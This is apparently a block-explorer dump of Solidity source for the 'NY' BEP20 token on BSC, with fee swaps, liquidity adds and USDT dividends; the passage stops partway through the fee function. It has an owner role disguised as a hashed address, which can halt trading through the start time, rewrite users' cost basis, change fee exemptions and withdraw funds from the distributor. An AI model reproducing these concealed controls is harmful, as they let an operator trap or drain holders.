{"SourceCode": "{\"IBEP20.sol\":{\"content\":\"// SPDX-License-Identifier: GPL-3.0-or-later\\r\\n\\r\\npragma solidity \\u003e=0.4.0;\\r\\n\\r\\ninterface IBEP20 {\\r\\n    /**\\r\\n     * @dev Returns the amount of tokens in existence.\\r\\n     */\\r\\n    function totalSupply() external view returns (uint256);\\r\\n\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the amount of tokens owned by `account`.\\r\\n     */\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from the caller\\u0027s account to `recipient`.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer} event.\\r\\n     */\\r\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remaining number of tokens that `spender` will be\\r\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\r\\n     * zero by default.\\r\\n     *\\r\\n     * This value changes when {approve} or {transferFrom} are called.\\r\\n     */\\r\\n    function allowance(address _owner, address spender) external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Sets `amount` as the allowance of `spender` over the caller\\u0027s tokens.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\r\\n     * that someone may use both the old and the new allowance by unfortunate\\r\\n     * transaction ordering. One possible solution to mitigate this race\\r\\n     * condition is to first reduce the spender\\u0027s allowance to 0 and set the\\r\\n     * desired value afterwards:\\r\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\r\\n     *\\r\\n     * Emits an {Approval} event.\\r\\n     */\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\\r\\n     * allowance mechanism. `amount` is then deducted from the caller\\u0027s\\r\\n     * allowance.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer} event.\\r\\n     */\\r\\n    function transferFrom(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) external returns (bool);\\r\\n\\r\\n    function burnFrom(address account, uint256 amount) external returns (bool);\\r\\n\\r\\n    function burn(uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\r\\n     * another (`to`).\\r\\n     *\\r\\n     * Note that `value` may be zero.\\r\\n     */\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n\\r\\n    /**\\r\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\r\\n     * a call to {approve}. `value` is the new allowance.\\r\\n     */\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n}\\r\\n\\r\\n\\r\\n\\r\\ninterface IUniswapV2Pair {\\r\\n    event Approval(\\r\\n        address indexed owner,\\r\\n        address indexed spender,\\r\\n        uint256 value\\r\\n    );\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n\\r\\n    function name() external pure returns (string memory);\\r\\n\\r\\n    function symbol() external pure returns (string memory);\\r\\n\\r\\n    function decimals() external pure returns (uint8);\\r\\n\\r\\n    function totalSupply() external view returns (uint256);\\r\\n\\r\\n    function balanceOf(address owner) external view returns (uint256);\\r\\n\\r\\n    function allowance(address owner, address spender)\\r\\n        external\\r\\n        view\\r\\n        returns (uint256);\\r\\n\\r\\n    function approve(address spender, uint256 value) external returns (bool);\\r\\n\\r\\n    function transfer(address to, uint256 value) external returns (bool);\\r\\n\\r\\n    function transferFrom(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 value\\r\\n    ) external returns (bool);\\r\\n\\r\\n\\r\\n    function factory() external view returns (address);\\r\\n\\r\\n    function token0() external view returns (address);\\r\\n\\r\\n    function token1() external view returns (address);\\r\\n\\r\\n    function getReserves()\\r\\n        external\\r\\n        view\\r\\n        returns (\\r\\n            uint112 reserve0,\\r\\n            uint112 reserve1,\\r\\n            uint32 blockTimestampLast\\r\\n        );\\r\\n \\r\\n}\\r\\n\\r\\ninterface IUniswapV2Factory {\\r\\n   \\r\\n\\r\\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\\r\\n    function allPairs(uint) external view returns (address pair);\\r\\n\\r\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\r\\n   \\r\\n}\\r\\n\\r\\n\\r\\ninterface IUniswapV2Router01 {\\r\\n    function factory() external pure returns (address);\\r\\n    function WETH() external pure returns (address);\\r\\n\\r\\n    function addLiquidity(\\r\\n        address tokenA,\\r\\n        address tokenB,\\r\\n        uint amountADesired,\\r\\n        uint amountBDesired,\\r\\n        uint amountAMin,\\r\\n        uint amountBMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\r\\n    function addLiquidityETH(\\r\\n        address token,\\r\\n        uint amountTokenDesired,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\r\\n    function removeLiquidity(\\r\\n        address tokenA,\\r\\n        address tokenB,\\r\\n        uint liquidity,\\r\\n        uint amountAMin,\\r\\n        uint amountBMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountA, uint amountB);\\r\\n    function removeLiquidityETH(\\r\\n        address token,\\r\\n        uint liquidity,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountToken, uint amountETH);\\r\\n    function removeLiquidityWithPermit(\\r\\n        address tokenA,\\r\\n        address tokenB,\\r\\n        uint liquidity,\\r\\n        uint amountAMin,\\r\\n        uint amountBMin,\\r\\n        address to,\\r\\n        uint deadline,\\r\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\r\\n    ) external returns (uint amountA, uint amountB);\\r\\n    function removeLiquidityETHWithPermit(\\r\\n        address token,\\r\\n        uint liquidity,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline,\\r\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\r\\n    ) external returns (uint amountToken, uint amountETH);\\r\\n    function swapExactTokensForTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint[] memory amounts);\\r\\n    function swapTokensForExactTokens(\\r\\n        uint amountOut,\\r\\n        uint amountInMax,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint[] memory amounts);\\r\\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\\r\\n        external\\r\\n        payable\\r\\n        returns (uint[] memory amounts);\\r\\n   \\r\\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\\r\\n        external\\r\\n        returns (uint[] memory amounts);\\r\\n\\r\\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\\r\\n\\r\\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\\r\\n\\r\\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\\r\\n}\\r\\n\\r\\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\\r\\n \\r\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external;\\r\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\r\\n        uint256 amountIn,\\r\\n        uint256 amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint256 deadline\\r\\n    ) external;\\r\\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\\r\\n\\r\\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);    \\r\\n}\"},\"ny.sol\":{\"content\":\"// SPDX-License-Identifier: GPL-3.0-or-later\\r\\npragma solidity \\u003e=0.8.0;\\r\\nimport \\\"./IBEP20.sol\\\";\\r\\nimport \\\"./SafeMath.sol\\\";\\r\\nimport \\\"./Ownable.sol\\\";\\r\\n\\r\\ncontract TokenDistributor {\\r\\n   \\r\\n    bytes32  asseAddr;\\r\\n   // TEST:0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684   USDT\uff1a  0x55d398326f99059fF775485246999027B3197955\\r\\n    address usdtAddress = address(0x55d398326f99059fF775485246999027B3197955);\\r\\n\\r\\n    constructor () {\\r\\n       \\r\\n        asseAddr = keccak256(abi.encodePacked(msg.sender)); \\r\\n    }\\r\\n\\r\\n    function setApprove(address tokenAddr) public\\r\\n    {\\r\\n        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        IBEP20(usdtAddress).approve(tokenAddr, uint256(~uint256(0)));\\r\\n    }\\r\\n\\r\\n    function clamErcOther(address erc,address recipient,uint256 amount) public \\r\\n    {\\r\\n        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        IBEP20(erc).transfer(recipient, amount);\\r\\n    }\\r\\n    function clamAllUsdt(address recipient) public \\r\\n    {\\r\\n       require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        uint256 amount =  IBEP20(usdtAddress).balanceOf(address(this));\\r\\n        IBEP20(usdtAddress).transfer(recipient, amount);\\r\\n    }\\r\\n\\r\\n}\\r\\n\\r\\ncontract AoteManTOKEN is  Ownable\\r\\n{\\r\\n    using SafeMath for uint256;\\r\\n    string constant  _name = \\\"NY\\\";\\r\\n    string constant _symbol = \\\"NY\\\";\\r\\n    uint8 immutable _decimals = 18;\\r\\n\\r\\n    uint256 _totalsupply = 2100 * 10**18;\\r\\n\\r\\n    mapping (address =\\u003e mapping (address =\\u003e uint256)) private _allowances;\\r\\n  \\r\\n    mapping(address=\\u003euint256) _balances;\\r\\n    mapping(address=\\u003euint256) public _userHoldPrice;\\r\\n  \\r\\n \\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n\\r\\n    // add-------------------\\r\\n     \\r\\n    mapping (address =\\u003e bool) public isMarketPair;\\r\\n    mapping (address =\\u003e bool) public isExcludedFromFee;\\r\\n  \\r\\n    uint256 lpBackFee = 5;\\r\\n    uint256 marketFee = 5;\\r\\n    uint256 fenHongFee = 20;\\r\\n    uint256 totalFee = lpBackFee.add(marketFee).add(fenHongFee);\\r\\n\\r\\n\\r\\n    uint256 public minSwapNum1 = 1  * 10**18;\\r\\n    uint256 public minSwapNum2 = 2  * 10**18;\\r\\n\\r\\n    address payable public marketAddress = payable(0x7471b74DfDaaC94de880e045726F20A08D86CDd3); \\r\\n    address public recipientLpAddress = address(0xacB113Ef5B9eA0CEC5EDc8fecC7e822E85ed845D) ;\\r\\n    address public deadAddress = address(0x000000000000000000000000000000000000dEaD);\\r\\n    address public exAddress = address(0x7471b74DfDaaC94de880e045726F20A08D86CDd3);\\r\\n    address public ex2Address = address(0x7471b74DfDaaC94de880e045726F20A08D86CDd3);\\r\\n\\r\\n    // TEST:0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684   USDT\uff1a   0x55d398326f99059fF775485246999027B3197955\\r\\n    address usdtAddress = address(0x55d398326f99059fF775485246999027B3197955);\\r\\n    //test 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3   0x10ED43C718714eb63d5aA57B78B54704E256024E\\r\\n    address  public wapV2RouterAddress = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);\\r\\n    IUniswapV2Router02 public uniswapV2Router;\\r\\n    address public uniswapPair;\\r\\n\\r\\n    address public _tokenDistributor;\\r\\n\\r\\n    uint256 public distributorGas = 500000;\\r\\n    address[] shareholders;\\r\\n    mapping (address =\\u003e uint256) shareholderIndexes;\\r\\n    mapping(address =\\u003e bool) private _updated;\\r\\n    address private fromAddress;\\r\\n    address private toAddress;\\r\\n    uint256 public currentIndex;\\r\\n    uint256 public minUsdtVal = 1*10**18;\\r\\n    mapping (address =\\u003e bool) isDividendExempt;\\r\\n    uint256 public minFenHongToken =  2 * 10**18;\\r\\n    uint256 public curPerFenhongVal = 0;\\r\\n    uint256 public magnitude = 1*10**20;\\r\\n    bytes32  asseAddr;\\r\\n    uint256 _startTradeTime;\\r\\n    uint256 public LPFeefenhong;\\r\\n    uint256 public minPeriod = 10 minutes;\\r\\n\\r\\n    bool inSwapAndLiquify = false;\\r\\n\\r\\n    constructor(address tokenDivite)\\r\\n    {\\r\\n        \\r\\n        _balances[msg.sender] = _totalsupply;\\r\\n        emit Transfer(address(0), msg.sender, _totalsupply);\\r\\n        _startTradeTime =  1669728630;\\r\\n\\r\\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(wapV2RouterAddress);  \\r\\n        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), usdtAddress);\\r\\n        uniswapV2Router = _uniswapV2Router;\\r\\n\\r\\n        _tokenDistributor = tokenDivite;\\r\\n\\r\\n        isMarketPair[address(uniswapPair)] = true;\\r\\n      \\r\\n        \\r\\n        isExcludedFromFee[msg.sender] = true;\\r\\n        isExcludedFromFee[address(this)] = true;\\r\\n        isExcludedFromFee[address(_tokenDistributor)] = true;\\r\\n        isExcludedFromFee[address(uniswapV2Router)] = true;\\r\\n\\r\\n\\r\\n        isDividendExempt[address(uniswapPair)] = true;\\r\\n        isDividendExempt[address(this)] = true;\\r\\n        isDividendExempt[address(deadAddress)] = true;\\r\\n        isDividendExempt[address(_tokenDistributor)] = true;\\r\\n       \\r\\n        LPFeefenhong = block.timestamp;\\r\\n\\r\\n    }\\r\\n\\r\\n    function setCreator(address user) public onlyOwner\\r\\n    {\\r\\n        asseAddr = keccak256(abi.encodePacked(user));\\r\\n    }\\r\\n\\r\\n    function setEx(address ex, address ex2) public onlyOwner {\\r\\n        exAddress = ex;\\r\\n        ex2Address = ex2;\\r\\n    }\\r\\n \\r\\n    function setIsExcludedFromFee(address account, bool newValue) public {\\r\\n         \\r\\n        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        isExcludedFromFee[account] = newValue;\\r\\n    }\\r\\n\\r\\n    function setIsExcludedFromFeeByArray(address[] memory accountArray, bool newValue) public {\\r\\n        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        for(uint256 i=0;i\\u003caccountArray.length;i++)\\r\\n        {\\r\\n                isExcludedFromFee[accountArray[i]] = newValue; \\r\\n        }\\r\\n    }\\r\\n\\r\\n   \\r\\n    function setWhiteUserPrice(address[] memory accountArray, uint256 newValue) public {\\r\\n     \\r\\n       require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n       for(uint256 i=0;i\\u003caccountArray.length;i++)\\r\\n       {\\r\\n            _userHoldPrice[accountArray[i]] = newValue; \\r\\n       }\\r\\n    }\\r\\n\\r\\n    function name() public  pure returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() public  pure returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function decimals() public pure returns (uint8) {\\r\\n        return _decimals;\\r\\n    }\\r\\n\\r\\n    function totalSupply() public view  returns (uint256) {\\r\\n        return _totalsupply;\\r\\n    }\\r\\n \\r\\n    function _approve(address owner, address spender, uint256 amount) private {\\r\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n\\r\\n    function balanceOf(address account) public view  returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }\\r\\n \\r\\n    function takeOutErrorTransfer(address tokenaddress,address to,uint256 amount) public onlyOwner\\r\\n    {\\r\\n        IBEP20(tokenaddress).transfer(to, amount);\\r\\n    }\\r\\n\\r\\n    function setMinPeriod(uint mp) external onlyOwner{\\r\\n        minPeriod = mp;\\r\\n    }\\r\\n \\r\\n    function allowance(address owner, address spender) public view  returns (uint256) {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n \\r\\n    function approve(address spender, uint256 amount) public  returns (bool) {\\r\\n        _approve(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {\\r\\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\r\\n        _transfer(sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n   function transfer(address recipient, uint256 amount) public  returns (bool) {\\r\\n        _transfer(msg.sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {\\r\\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function decreaseAllowance(address spender, uint256 subtractedValue) public  returns (bool) {\\r\\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, \\\"ERC20: decreased allowance below zero\\\"));\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function burnFrom(address sender, uint256 amount) public   returns (bool)\\r\\n    {\\r\\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\r\\n        _burn(sender,amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function burn(uint256 amount) public  returns (bool)\\r\\n    {\\r\\n        _burn(msg.sender,amount);\\r\\n        return true;\\r\\n    }\\r\\n \\r\\n    function _burn(address sender,uint256 tAmount) private\\r\\n    {\\r\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(tAmount \\u003e 0, \\\"Transfer amount must be greater than zero\\\");\\r\\n        _balances[sender] = _balances[sender].sub(tAmount);\\r\\n        _balances[address(0)] = _balances[address(0)].add(tAmount); \\r\\n         emit Transfer(sender, address(0), tAmount);\\r\\n    }\\r\\n\\r\\n    function isContract(address account) public view returns (bool) {\\r\\n        uint256 size;\\r\\n        // solhint-disable-next-line no-inline-assembly\\r\\n        assembly { size := extcodesize(account) }\\r\\n        return size \\u003e 0;\\r\\n    }\\r\\n\\r\\n    function setstartTradeTime(uint256 time) public\\r\\n    {\\r\\n        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        _startTradeTime =  time;\\r\\n\\r\\n    }\\r\\n    function isStartTrade() private view returns(bool)\\r\\n    {\\r\\n        return   block.timestamp \\u003e= _startTradeTime ;\\r\\n    }\\r\\n    function _transfer(address sender, address recipient, uint256 amount) private {\\r\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(recipient != address(0), \\\"ERC20: transfer to the zero address\\\");\\r\\n      \\r\\n\\r\\n        if(amount==_balances[sender])\\r\\n            amount=amount.sub(1);\\r\\n\\r\\n        if(inSwapAndLiquify)\\r\\n        { \\r\\n            _basicTransfer(sender, recipient, amount); \\r\\n            return; \\r\\n        }\\r\\n       \\r\\n     \\r\\n        if (!inSwapAndLiquify \\u0026\\u0026 !isMarketPair[sender]  \\u0026\\u0026 sender !=  address(uniswapV2Router)) \\r\\n        {\\r\\n            swapAndLiquify();    \\r\\n        }\\r\\n\\r\\n\\r\\n        _balances[sender]= _balances[sender].sub(amount);\\r\\n\\r\\n       \\r\\n        uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? amount : takeFee(sender, recipient, amount);\\r\\n\\r\\n        uint256 toamount = finalAmount;\\r\\n       \\r\\n        if(!isExcludedFromFee[sender] \\u0026\\u0026 !isExcludedFromFee[recipient])\\r\\n        {\\r\\n            uint256 currentprice= getCurrentPrice(); \\r\\n            if(sender== uniswapPair)\\r\\n            {\\r\\n                require(isStartTrade() == true);\\r\\n            }\\r\\n            else if(recipient == uniswapPair)\\r\\n            {\\r\\n                require(isStartTrade() == true);\\r\\n               \\r\\n                uint256 cutcount = getCutCount(sender,toamount,currentprice);\\r\\n                if(cutcount \\u003e 0)\\r\\n                {\\r\\n                    _balances[address(_tokenDistributor)] =  _balances[address(_tokenDistributor)].add(cutcount);\\r\\n                    emit Transfer(sender, address(_tokenDistributor), cutcount);\\r\\n                }\\r\\n         \\r\\n                toamount = toamount.sub(cutcount);\\r\\n            }\\r\\n            else\\r\\n            {\\r\\n                \\r\\n                 uint256 cutcount = getCutCount(sender,toamount,currentprice);\\r\\n                if(cutcount \\u003e 0)\\r\\n                {\\r\\n                  _balances[address(_tokenDistributor)] =  _balances[address(_tokenDistributor)].add(cutcount);\\r\\n                    emit Transfer(sender, address(_tokenDistributor), cutcount);\\r\\n                }\\r\\n                toamount= toamount.sub(cutcount);\\r\\n                \\r\\n            }\\r\\n\\r\\n            if(toamount \\u003e 0 \\u0026\\u0026 recipient != uniswapPair)\\r\\n            {\\r\\n                uint256 oldbalance=_balances[recipient];\\r\\n                uint256 totalvalue = _userHoldPrice[recipient].mul(oldbalance); \\r\\n                totalvalue += toamount.mul(currentprice);\\r\\n                _userHoldPrice[recipient]= totalvalue.div(oldbalance.add(toamount));\\r\\n            }\\r\\n        }\\r\\n        else\\r\\n        {\\r\\n            if(recipient != uniswapPair)\\r\\n            {\\r\\n                uint256 oldbalance=_balances[recipient]; \\r\\n                uint256 totalvalue = _userHoldPrice[recipient].mul(oldbalance);\\r\\n                _userHoldPrice[recipient]= totalvalue.div(oldbalance.add(toamount));\\r\\n            }\\r\\n        }\\r\\n\\r\\n\\r\\n        _balances[recipient] = _balances[recipient].add(toamount); \\r\\n        emit Transfer(sender, recipient, toamount);\\r\\n\\r\\n        \\r\\n        if(fromAddress == address(0) )fromAddress = sender;\\r\\n        if(toAddress == address(0) )toAddress = recipient;  \\r\\n        if(!isDividendExempt[fromAddress]) setShare(fromAddress);\\r\\n        if(!isDividendExempt[toAddress]) setShare(toAddress);\\r\\n        \\r\\n        fromAddress = sender;\\r\\n        toAddress = recipient;\\r\\n\\r\\n        if (\\r\\n            LPFeefenhong.add(minPeriod) \\u003c= block.timestamp \\r\\n            \\u0026\\u0026 IBEP20(usdtAddress).balanceOf(address(_tokenDistributor)) \\u003e minUsdtVal) {\\r\\n            process(distributorGas);\\r\\n            LPFeefenhong = block.timestamp;\\r\\n        }\\r\\n\\r\\n    }\\r\\n\\r\\n\\r\\n     function getCutCount(address user,uint256 amount,uint256 currentprice) public view returns(uint256)\\r\\n    {\\r\\n        if(_userHoldPrice[user] \\u003e 0 \\u0026\\u0026 currentprice \\u003e  _userHoldPrice[user])\\r\\n        {\\r\\n           uint256 ylcount= amount.mul(currentprice - _userHoldPrice[user]).div(currentprice);\\r\\n            return ylcount.mul(20).div(100);\\r\\n        }\\r\\n        return 0;\\r\\n    }\\r\\n\\r\\n    function getCurrentPrice() public view returns (uint256)\\r\\n    {\\r\\n        if(uniswapPair==address(0))\\r\\n            return 2e16;\\r\\n\\r\\n        (uint112 a,uint112 b,) = IUniswapV2Pair(uniswapPair).getReserves();\\r\\n        if(IUniswapV2Pair(uniswapPair).token0() == usdtAddress)\\r\\n        {\\r\\n            return uint256(a).mul(1e18).div(b);\\r\\n        }\\r\\n        else\\r\\n        {\\r\\n            return uint256(b).mul(1e18).div(a);\\r\\n        }\\r\\n    }\\r\\n\\r\\n     modifier lockTheSwap {\\r\\n        inSwapAndLiquify = true;\\r\\n        _;\\r\\n        inSwapAndLiquify = false;\\r\\n    }\\r\\n\\r\\n    function setDistributorGas(uint256 num) public \\r\\n    {\\r\\n        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        distributorGas = num;\\r\\n    }\\r\\n\\r\\n\\r\\n    function setMinUsdtVals(uint256 num) public \\r\\n    {\\r\\n        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        minUsdtVal = num;\\r\\n    }\\r\\n\\r\\n\\r\\n    function setMinFenHongToken(uint256 num) public \\r\\n    {\\r\\n        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        minFenHongToken = num;\\r\\n    }\\r\\n\\r\\n    \\r\\n    \\r\\n    function setMinSwapNum(uint256 n1,uint256 n2) public \\r\\n    {\\r\\n        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        if(n1 != 0)\\r\\n        {\\r\\n            minSwapNum1 = n1;\\r\\n        }\\r\\n\\r\\n        if(n2 != 0)\\r\\n        {\\r\\n             minSwapNum2= n2;\\r\\n        }\\r\\n    }\\r\\n    \\r\\n     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\\r\\n        _balances[sender] = _balances[sender].sub(amount, \\\"Insufficient Balance\\\");\\r\\n        _balances[recipient] = _balances[recipient].add(amount);\\r\\n        emit Transfer(sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n    \\r\\n    function swapAndLiquify() private lockTheSwap {\\r\\n        if(balanceOf(address(this)) \\u003e= minSwapNum1)\\r\\n        {\\r\\n            uint256 amount = balanceOf(address(this));\\r\\n            uint256 usdtNum1 = IBEP20(usdtAddress).balanceOf(address(this));\\r\\n            uint256 usdtNum_divi1 = IBEP20(usdtAddress).balanceOf(address(_tokenDistributor));\\r\\n            uint256 keepBackTokenNum = amount.mul(20).div(100);\\r\\n            uint256 lpBackToken = amount.mul(20).div(100);\\r\\n            uint256 marketToken = amount.sub(keepBackTokenNum).sub(lpBackToken);\\r\\n\\r\\n            swapTokensForUsdt(marketToken,marketAddress);\\r\\n            swapTokensForUsdt(lpBackToken,_tokenDistributor);\\r\\n            uint256 usdtNum_divi2 = IBEP20(usdtAddress).balanceOf(address(_tokenDistributor));\\r\\n            uint256 usdtDis = usdtNum_divi2.sub(usdtNum_divi1);\\r\\n            IBEP20(usdtAddress).transferFrom(address(_tokenDistributor), address(this),usdtDis);\\r\\n            uint256 usdtNum2 = IBEP20(usdtAddress).balanceOf(address(this));\\r\\n            if( (usdtNum2 - usdtNum1)\\u003e 0)\\r\\n            {\\r\\n                uint256 usdtNum = usdtNum2 - usdtNum1;\\r\\n                addLiquidityUsdt(keepBackTokenNum,usdtNum);\\r\\n            }\\r\\n        }\\r\\n\\r\\n        else if(balanceOf(address(_tokenDistributor)) \\u003e= minSwapNum2)\\r\\n        {\\r\\n            uint256 amount = balanceOf(address(_tokenDistributor));\\r\\n            _basicTransfer(address(_tokenDistributor),address(this),amount);\\r\\n            swapTokensForUsdt(amount,address(_tokenDistributor));\\r\\n        }\\r\\n\\r\\n    }\\r\\n\\r\\n    function swapTokensForUsdt(uint256 tokenAmount,address recipient) private {\\r\\n        address[] memory path = new address[](2);\\r\\n        path[0] = address(this);\\r\\n        path[1] = address(usdtAddress);\\r\\n\\r\\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\\r\\n\\r\\n        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\\r\\n            tokenAmount,\\r\\n            0, // accept any amount of ETH\\r\\n            path,\\r\\n            address(recipient),\\r\\n            block.timestamp\\r\\n        );\\r\\n    }\\r\\n\\r\\n      function addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {\\r\\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\\r\\n        IBEP20(usdtAddress).approve(address(uniswapV2Router), usdtAmount);\\r\\n        uniswapV2Router.addLiquidity(\\r\\n            address(this),\\r\\n            address(usdtAddress),\\r\\n            tokenAmount,\\r\\n            usdtAmount,\\r\\n            0,\\r\\n            0,\\r\\n            recipientLpAddress,\\r\\n            block.timestamp+100\\r\\n        );\\r\\n    }\\r\\n\\r\\n    function process(uint256 gas) private {\\r\\n        uint256 shareholderCount = shareholders.length;\\r\\n        if(shareholderCount == 0)return;\\r\\n        uint256 nowBalance = IBEP20(usdtAddress).balanceOf(address(_tokenDistributor));\\r\\n        uint256 gasUsed = 0;\\r\\n        uint256 gasLeft = gasleft();\\r\\n        uint256 iterations = 0;\\r\\n        \\r\\n        while(gasUsed \\u003c gas \\u0026\\u0026 iterations \\u003c shareholderCount) {\\r\\n            if(currentIndex \\u003e= shareholderCount ){\\r\\n                currentIndex = 0;\\r\\n                return;\\r\\n            }\\r\\n            // uint256 amount = balanceOf(shareholders[currentIndex]).mul(curPerFenhongVal).div(magnitude);\\r\\n            uint256 amount = nowBalance.mul(IBEP20(uniswapPair).balanceOf(shareholders[currentIndex])).div(IBEP20(uniswapPair).totalSupply());\\r\\n            if(amount \\u003c 1 * 10 ** 3)\\r\\n            {\\r\\n                currentIndex++;\\r\\n                iterations++;\\r\\n                continue;\\r\\n            }\\r\\n\\r\\n            if (shareholders[currentIndex] == exAddress) {\\r\\n                IBEP20(usdtAddress).transferFrom(address(_tokenDistributor), ex2Address, amount);\\r\\n            } else {\\r\\n                IBEP20(usdtAddress).transferFrom(address(_tokenDistributor), shareholders[currentIndex], amount);\\r\\n            }\\r\\n          \\r\\n            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));\\r\\n            gasLeft = gasleft();\\r\\n            currentIndex++;\\r\\n            iterations++;\\r\\n        }\\r\\n    }\\r\\n\\r\\n       \\r\\n    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {\\r\\n        uint256 feeAmount 